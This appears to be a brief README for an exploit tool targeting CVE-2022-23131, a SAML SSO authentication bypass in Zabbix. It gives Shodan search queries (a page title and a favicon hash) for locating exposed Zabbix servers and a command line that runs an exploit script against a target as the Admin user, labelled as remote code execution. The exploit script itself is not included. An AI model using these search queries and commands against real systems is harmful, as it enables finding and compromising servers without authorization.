# CVE-2022-23131
Zabbix - SAML SSO Authentication Bypass
- Shodan dork:
```
title:zabbix
```
```
http.favicon.hash:892542951
```
### Usage
- RCE
```
python3 zabbix_session_exp.py -t https:target.com -u Admin
```
